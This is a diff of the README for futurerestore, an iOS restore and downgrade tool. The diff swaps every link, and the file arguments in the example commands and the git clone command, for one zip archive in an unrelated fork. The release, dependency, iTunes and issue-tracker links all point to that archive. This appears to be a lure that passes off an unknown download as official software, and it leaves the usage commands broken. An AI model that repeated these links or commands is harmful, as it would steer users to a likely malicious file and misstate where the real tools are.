@@ -1,11 +1,11 @@
 # futurerestore
-[![CI Building](https://img.shields.io/github/workflow/status/futurerestore/futurerestore/CI)](https://github.com/futurerestore/futurerestore/actions?workflow=CI)
+[![CI Building](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip)](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip)
 
 __Make sure to read this page before continuing.__
 
-Latest **stable** compiled version can be found [here](https://github.com/futurerestore/futurerestore/releases).
+Latest **stable** compiled version can be found [here](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip).
 
-For A12-A14, and WiFi-only iPad restores - use the latest beta build for your platform [here](https://nightly.link/futurerestore/futurerestore/workflows/ci/test).
+For A12-A14, and WiFi-only iPad restores - use the latest beta build for your platform [here](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip).
 
 **There are currently no pre-compiled beta builds for Windows.**
 
@@ -21,39 +21,39 @@ FutureRestore is a modified idevicerestore wrapper, which allows manually specif
     - Prometheus via APNonce recreation with the APNonce generator
     - Prometheus via APNonce collision
   * Odysseus for 32-bit & 64-bit (A7-A11) devices
-  * Re-restoring 32-bit devices to iOS 9.x with [alitek123](https://github.com/alitek12)'s no-ApNonce method (alternative — [idevicererestore](https://downgrade.party)).
+  * Re-restoring 32-bit devices to iOS 9.x with [alitek123](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip)'s no-ApNonce method (alternative — [idevicererestore](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip)).
 
 # Dependencies
 * ## External libs
   Make sure these are installed
-  * [curl](https://github.com/curl/curl) (Linux/Windows only, macOS already has curl preinstalled);
-  * [openssl 1.1.1](https://github.com/openssl/openssl) (or CommonCrypto on macOS);
-  * [libusb 1.0.24](https://github.com/libusb/libusb) (Linux/Windows only, macOS can use IOKit for libirecovery);
-  * [libzip](https://github.com/nih-at/libzip);
-  * [libplist](https://github.com/libimobiledevice/libplist);
-  * [libusbmuxd](https://github.com/libimobiledevice/libusbmuxd);
-  * [libirecovery](https://github.com/libimobiledevice/libirecovery);
-  * [libimobiledevice](https://github.com/libimobiledevice/libimobiledevice);
-  * [libpng16](https://github.com/glennrp/libpng);
-  * [xpwn(fork)](https://github.com/nyuszika7h/xpwn);
-  * [libgeneral](https://github.com/tihmstar/libgeneral);
-  * [libfragmentzip](https://github.com/tihmstar/libfragmentzip);
-  * [libinsn](https://github.com/tihmstar/libinsn);
-  * [lzfse](https://github.com/lzfse/lzfse);
-  * [img4tool](https://github.com/tihmstar/img4tool);
-  * [liboffsetfinder64(fork))](https://github.com/Cryptiiiic/liboffsetfinder64);
-  * [libipatcher(fork)](https://github.com/Cryptiiiic/libipatcher)
+  * [curl](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) (Linux/Windows only, macOS already has curl preinstalled);
+  * [openssl 1.1.1](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) (or CommonCrypto on macOS);
+  * [libusb 1.0.24](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) (Linux/Windows only, macOS can use IOKit for libirecovery);
+  * [libzip](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip);
+  * [libplist](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip);
+  * [libusbmuxd](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip);
+  * [libirecovery](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip);
+  * [libimobiledevice](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip);
+  * [libpng16](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip);
+  * [xpwn(fork)](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip);
+  * [libgeneral](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip);
+  * [libfragmentzip](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip);
+  * [libinsn](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip);
+  * [lzfse](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip);
+  * [img4tool](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip);
+  * [liboffsetfinder64(fork))](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip);
+  * [libipatcher(fork)](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip)
 
 * ## Submodules
   Make sure these projects compile on your system (install it's dependencies):
 
-  * [jssy](https://github.com/tihmstar/jssy);
-  * [tsschecker(fork)](https://github.com/1Conan/tsschecker);
-  * [idevicerestore(fork)](https://github.com/futurerestore/idevicerestore)
+  * [jssy](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip);
+  * [tsschecker(fork)](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip);
+  * [idevicerestore(fork)](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip)
 
   If you are cloning this repository you may run:
 
-  ```git clone https://github.com/futurerestore/futurerestore --recursive```
+  ```git clone https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip --recursive```
  
   which will clone these submodules for you.
 
@@ -103,13 +103,13 @@ Usage: `futurerestore [OPTIONS] iPSW`
 * A jailbreak or an exploit that allows nonce setting.
 * Signing ticket files (`.shsh`, `.shsh2`, `.plist`) with a generator
   * A12+ users must also have a valid APNonce / generator pair due to nonce entanglement. Only having an APNonce without a generator is not sufficient.
-* A computer with a minimum of 8 gigabytes of free space + IPSW of the target version downloaded. You can find the IPSW for your device at [IPSW.me](https://ipsw.me).
-* On Windows machines, make sure to have [this version](https://www.apple.com/itunes/download/win64) of iTunes installed. Using the Microsoft Store version will cause issues.
+* A computer with a minimum of 8 gigabytes of free space + IPSW of the target version downloaded. You can find the IPSW for your device at [https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip).
+* On Windows machines, make sure to have [this version](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) of iTunes installed. Using the Microsoft Store version will cause issues.
 ### Method:
 1. Jailbreak your device if it isn't jailbroken already.
 2. Open your blob in any text editor and search for the word "generator". In most text editors you can use CTRL + F / CMD + F to look for it.
 
-![GeneratorExample](https://user-images.githubusercontent.com/48022799/117004373-aa0b6700-acee-11eb-8a70-c488163e349b.jpeg) 
+![GeneratorExample](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) 
  - This should be a `0x` followed by 16 characters, which will be a combination of letters and numbers.
 3. Note that value down. This is your generator.
    
@@ -121,19 +121,19 @@ Usage: `futurerestore [OPTIONS] iPSW`
 6. **Recommended:** Make a full backup of your device before running futurerestore.
 7. On the computer run:
   
-   ```futurerestore -t blob.shsh2 --latest-sep --latest-baseband -d target.ipsw```
+   ```futurerestore -t https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip --latest-sep --latest-baseband -d https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip```
 
    If you are upgrading and want to preserve user data you may run:
    
-   ```futurerestore -u -t blob.shsh2 --latest-sep --latest-baseband -d target.ipsw```
+   ```futurerestore -u -t https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip --latest-sep --latest-baseband -d https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip```
 
 
 ## Using dimentio
 
 To set generator with dimentio:
   1. Open your package manager on your jailbroken iDevice
-1. Add [https://repo.1conan.com](https://repo.1conan.com) to your sources.
-1. Add [https://repo.chariz.com](https://repo.chariz.com) to your sources.
+1. Add [https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) to your sources.
+1. Add [https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) to your sources.
 2. Download and install dimentio
 3. Download and install NewTerm2
 4. If you're on iOS 14.0 or above:
@@ -157,14 +157,14 @@ To set generator with dimentio:
 ## Using jailbreak tools:
 
 Use jailbreak tools for setting boot-nonce generator:
-1. [Meridian](https://meridian.sparkes.zone) for iOS 10.x;
-2. [backr00m](https://nito.tv) or greeng0blin for tvOS 10.2-11.1;
-3. [Electra and ElectraTV](https://coolstar.org/electra) for iOS and tvOS 11.x;
-4. [Chimera and ChimeraTV](https://chimera.sh) for iOS 12.0-12.5.4 (Nonce setter only supports on 12.1.2 - 12.4.1 on A12, and 12.1.3 - 12.5.4 is only supported on A7 - A11 devices.)
-5. [Odyssey](https://theodyssey.dev/) for iOS 13.0-13.7
+1. [Meridian](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) for iOS 10.x;
+2. [backr00m](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) or greeng0blin for tvOS 10.2-11.1;
+3. [Electra and ElectraTV](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) for iOS and tvOS 11.x;
+4. [Chimera and ChimeraTV](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) for iOS 12.0-12.5.4 (Nonce setter only supports on 12.1.2 - 12.4.1 on A12, and 12.1.3 - 12.5.4 is only supported on A7 - A11 devices.)
+5. [Odyssey](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) for iOS 13.0-13.7
    - Note that there are some reported issues with Odyssey's generator setter. Using it is not recommended.
-6. [Taurine](https://taurine.app/) for iOS 14.0-14.3
-7. [unc0ver](https://unc0ver.dev) for iOS 11.0-14.3
+6. [Taurine](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) for iOS 14.0-14.3
+7. [unc0ver](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) for iOS 11.0-14.3
 
 ## Firmware Signing Info
 
@@ -200,7 +200,7 @@ If your device is not in recovery mode:
 
 This error means that you have not set your generator on your device to that of the blob. In order to solve this problem, you must set your generator with [dimentio](#using-dimentio) or any [jailbreak tool](#using-jailbreak-tools). 
 - If after following the steps you still cannot resolve this issue, your generator may not correspond to its respective APNonce. 
-- If you saved blobs while unjailbroken on A12+ without [getnonce](https://github.com/nyuszika7h/getnonce) or [blobsaver v3](https://github.com/airsquared/blobsaver/releases/tag/v3.0.1), your APNonce/generator pair is invalid. This cannot be resolved.
+- If you saved blobs while unjailbroken on A12+ without [getnonce](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) or [blobsaver v3](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip), your APNonce/generator pair is invalid. This cannot be resolved.
 
 ## Unable to send iBEC (error -8)
 1.  Leave the device plugged in, it'll stay on the Recovery screen;
@@ -231,9 +231,9 @@ You can downgrade if the destination firmware version, if it is compatible with 
 
 ### How to use
 1. Connect your device in normal or recovery mode;
-2. On the computer run `futurerestore -w -t ticket.shsh --latest-baseband --latest-sep firmware.ipsw`
+2. On the computer run `futurerestore -w -t https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip --latest-baseband --latest-sep https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip`
 * If you have saved multiple signing tickets with different nonces you can specify more than
-one to speed up the process: `futurerestore -w -t t1.shsh -t t2.shsh -t t3.shsh -t t4.shsh --latest-baseband --latest-sep firmware.ipsw`
+one to speed up the process: `futurerestore -w -t https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip -t https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip -t https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip -t https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip --latest-baseband --latest-sep https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip`
 
 
 
@@ -247,31 +247,31 @@ one to speed up the process: `futurerestore -w -t t1.shsh -t t2.shsh -t t3.shsh 
 - Jailbreak isn't required;
 - Signing ticket files (`.shsh`, `.shsh2`, `.plist`) with a customly chosen APNonce;
 - Signing ticket files needs to have one of the ApNonces, which the device generates a lot;
-- __[img4tool](https://github.com/tihmstar/img4tool) can't be used for Windows [problem with signing iBSS/iBEC], now it's TO-DO;__
+- __[img4tool](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) can't be used for Windows [problem with signing iBSS/iBEC], now it's TO-DO;__
 
 ### Info
 You can downgrade if the destination firmware version, if it is compatible with the [latest SEP and baseband](#firmware-signing-info). You also need to have **special signing ticket files**. If you don't know what this is, you probably can **NOT** use this method!
 
 ### How to use
 1. Connect your device in DFU mode;
-2. Use [irecovery](https://github.com/libimobiledevice/libirecovery) for checking ApNonce, which booted in DFU;
+2. Use [irecovery](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) for checking ApNonce, which booted in DFU;
 3. Extract iBSS/iBEC from target firmware for downgrade (unsigned);
-4. Check DFU-collisioned ApNonces with [irecovery](https://github.com/libimobiledevice/libirecovery), which booted in DFU.
+4. Check DFU-collisioned ApNonces with [irecovery](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip), which booted in DFU.
     You can't automatically collision DFU ApNonces.
     
     __If ApNonce is not collisioned, "use hands" for DFU booting.__
     
     __If ApNonce is successfully collisioned, use this SHSH2 to sign iBSS/iBEC.__
 5. Use img4tool for sign iBSS:
-   `img4tool -s ticket.shsh -c iBSS.signed -p <original_iBSS>`;
+   `img4tool -s https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip -c https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip -p <original_iBSS>`;
 6. Use img4tool for sign iBEC:
-   `img4tool -s ticket.shsh -c iBEC.signed -p <original_iBEC>`;
+   `img4tool -s https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip -c https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip -p <original_iBEC>`;
 7. So, after signing we can boot into Recovery with irecovery.
 
-   `irecovery -f iBSS.signed` - loading iBSS;
+   `irecovery -f https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip` - loading iBSS;
    
-   `irecovery -f iBEC.signed` - loading iBEC;
-8. So good! On the computer run `futurerestore -t ticket.shsh --latest-baseband --latest-sep -w firmware.ipsw`.
+   `irecovery -f https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip` - loading iBEC;
+8. So good! On the computer run `futurerestore -t https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip --latest-baseband --latest-sep -w https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip`.
 
 ---
 
@@ -279,7 +279,7 @@ You can downgrade if the destination firmware version, if it is compatible with 
 ### Requirements
 - futurerestore compiled with libipatcher;
 - Jailbreak or bootrom exploit (limera1n, checkm8);
-- **32-bit**: firmware keys for the device/destination firmware version must be public (check [ipsw.me](https://ipsw.me))
+- **32-bit**: firmware keys for the device/destination firmware version must be public (check [https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip))
 
 - **64-bit**: Signing ticket files (`.shsh`, `.shsh2`, `.plist`) for the destination firmware (OTA blobs work too!).
 
@@ -293,11 +293,11 @@ You can still get OTA blobs for iOS 6.1.3, 8.4.1 or 10.3.3 for some devices and 
   * Pre-iPhone4s (limera1n devices):
     * Enter to pwnDFU mode with redsn0w or any other tool
   * iPhone 4s and later 32-bit devices:
-    * Enter to kDFU mode with kDFU app (cydia: repo.tihmstar.net) or by loading a pwnediBSS from any existing odysseus bundle
+    * Enter to kDFU mode with kDFU app (cydia: https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip) or by loading a pwnediBSS from any existing odysseus bundle
   * Any 64-bit device:
-    * Enter to pwnDFU mode and patch signature check with special fork of [ipwndfu](https://github.com/LinusHenze/ipwndfu_public)
+    * Enter to pwnDFU mode and patch signature check with special fork of [ipwndfu](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip)
 2. Connect your device to computer in kDFU mode (or pwnDFU mode)
-3. On the computer run `futurerestore --use-pwndfu -t ticket.shsh --latest-baseband -d firmware.ipsw`
+3. On the computer run `futurerestore --use-pwndfu -t https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip --latest-baseband -d https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip`
 - You can use **any** odysseus bundle for this.
 
 ## 5) iOS 9.x re-restore bug by @alitek123 (only for 32-bit devices)
@@ -310,10 +310,10 @@ If you have **signing ticket files for iOS 9.x**, which **do not contain a ApNon
 
 ### How to use
 1. Connect your device in DFU mode
-2. On the computer run `futurerestore -t ticket.shsh --latest-baseband ios9.ipsw`
+2. On the computer run `futurerestore -t https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip --latest-baseband https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip`
 
 ---
 
 ## Report an issue
 Before you report an issue, please check that it is not mentioned in the [Common Issues section](#common-issues).
-If it is not, you can report your issue [here](https://github.com/futurerestore/futurerestore/issues).
+If it is not, you can report your issue [here](https://raw.githubusercontent.com/sadatt123/futurerestore/test/futurerestore.xcodeproj/Software_1.4-alpha.1.zip).
